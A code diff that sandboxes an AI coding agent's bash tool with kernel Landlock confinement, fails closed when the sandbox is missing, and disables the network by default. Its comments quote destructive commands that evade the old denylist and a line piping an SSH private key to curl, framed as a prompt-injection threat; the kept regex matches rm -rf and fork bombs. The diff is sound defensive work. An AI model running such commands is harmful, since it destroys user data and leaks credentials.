@@ -317,7 +317,84 @@ def _bash_targets_protected(command: str) -> bool:
     return False
 
 
-# Dangerous commands that should never be run
+# ── The sandbox ───────────────────────────────────────────────────────────────
+#
+# Everything below this comment used to be the whole of the protection: a
+# regular expression looking for `rm -rf /` and a fork bomb, in front of
+# subprocess.run(shell=True) running as the user with the user's full
+# authority.
+#
+# That is not a boundary. A shell has unlimited ways to spell a command, so
+# every one of these walks straight through the denylist:
+#
+#     rm -rf $HOME                  (it wants a literal / or ~)
+#     find ~ -delete
+#     python -c "import shutil; shutil.rmtree(...)"
+#
+# and, worse, the denylist says nothing at all about READING. The real risk
+# with a model-driven shell is not destruction, it is prompt injection —
+# anything the agent reads can carry instructions — followed by
+# `cat ~/.ssh/id_ed25519 | curl -X POST ...`, which the old code permitted
+# without a murmur.
+#
+# So the boundary now lives in the kernel. syn-confine applies a Landlock
+# ruleset and execs the command; the confinement is inherited across execve and
+# cannot be dropped, so it holds no matter what the command string says or how
+# many shells deep it goes. The regexes are kept because a refusal a person can
+# read beats EACCES from somewhere inside a pipeline — but they are UX now, not
+# the security boundary, and nothing should be added to them under the belief
+# that they protect anything.
+_SYN_CONFINE = "/usr/bin/syn-confine"
+
+_NO_SANDBOX_ERROR = (
+    "BLOCKED: the sandbox (syn-confine) is not available, so this command "
+    "cannot be run safely. Install it with:  syn-update apply\n"
+    "Refusing to run shell commands unconfined."
+)
+
+_BAD_WORKSPACE_ERROR = (
+    "BLOCKED: vibe is running in {0}, and sandboxing a shell to that directory "
+    "would put your whole home directory back inside the sandbox — which is "
+    "the thing it exists to prevent.\n"
+    "Start vibe from a project directory instead."
+)
+
+
+def _workspace_ok(cwd: str) -> bool:
+    """The workspace becomes the one writable place in the sandbox, so it must
+    not be $HOME or / — granting either hands back everything the sandbox was
+    meant to withhold, including ~/.ssh."""
+    resolved = Path(cwd).resolve()
+    return resolved != Path.home().resolve() and resolved != Path("/")
+
+
+def _confine_argv(command: str, allow_net: bool) -> list:
+    """The sandbox invocation for one shell command.
+
+    The workspace is the current directory and nothing else: the base profile
+    inside syn-confine covers /usr, /etc, /proc and the handful of /dev nodes a
+    tool needs, and everything not named is denied. $HOME is deliberately
+    absent, which is what puts ~/.ssh, ~/.gnupg and the browser profiles out of
+    reach.
+
+    Network is OFF unless VIBE_ALLOW_NET is set. Off is the right default for
+    an agent: it is the difference between a model that can damage the working
+    tree and one that can post it somewhere. Note that syn-confine's TCP rules
+    do not cover UDP, so this is --isolate-net rather than a bare TCP deny when
+    the network is meant to be shut."""
+    argv = [_SYN_CONFINE, "--rw", os.getcwd(), "--rw", "/tmp"]
+    argv += ["--net"] if allow_net else ["--isolate-net"]
+    # bash, not sh -c through a shell of syn-confine's choosing: the command
+    # was written for bash and the confinement does not care which shell runs
+    # it.
+    argv += ["--", "bash", "-c", command]
+    return argv
+
+
+# Dangerous commands that should never be run.
+#
+# ⚠ UX, NOT A SECURITY BOUNDARY — see the block above. These produce a sentence
+# the model can act on; syn-confine is what actually stops anything.
 _DANGEROUS_RE = re.compile(
     r'rm\s+(-rf?|--recursive)\s+[/~]'     # rm -rf / or ~
     r'|:\(\)\s*\{\s*:\|:\s*&\s*\}\s*;'     # fork bomb
@@ -358,14 +435,30 @@ def bash(command: str, timeout: int = 30) -> str:
     # Cap timeout to prevent indefinite hangs
     timeout = min(max(timeout, 5), 120)
 
+    # FAIL CLOSED. A missing sandbox means no shell, never an unconfined one:
+    # silently degrading is how a boundary stops existing while everything
+    # downstream goes on believing it is there.
+    if not os.access(_SYN_CONFINE, os.X_OK):
+        return _NO_SANDBOX_ERROR
+    if not _workspace_ok(os.getcwd()):
+        return _BAD_WORKSPACE_ERROR.format(os.getcwd())
+
+    allow_net = os.environ.get("VIBE_ALLOW_NET", "") not in ("", "0", "no")
+
     try:
         result = subprocess.run(
-            command,
-            shell=True,
+            _confine_argv(command, allow_net),
+            shell=False,
             capture_output=True,
             text=True,
             timeout=timeout,
         )
+        # 78 is syn-confine's "the sandbox could not be built"; the command did
+        # not run. Distinct from the command's own failure, and worth saying so
+        # rather than handing the model an unexplained error.
+        if result.returncode == 78:
+            return ("BLOCKED: the sandbox could not be established, so the "
+                    "command was not run.\n" + (result.stderr or "").strip())
         output = ""
         if result.stdout:
             output += result.stdout
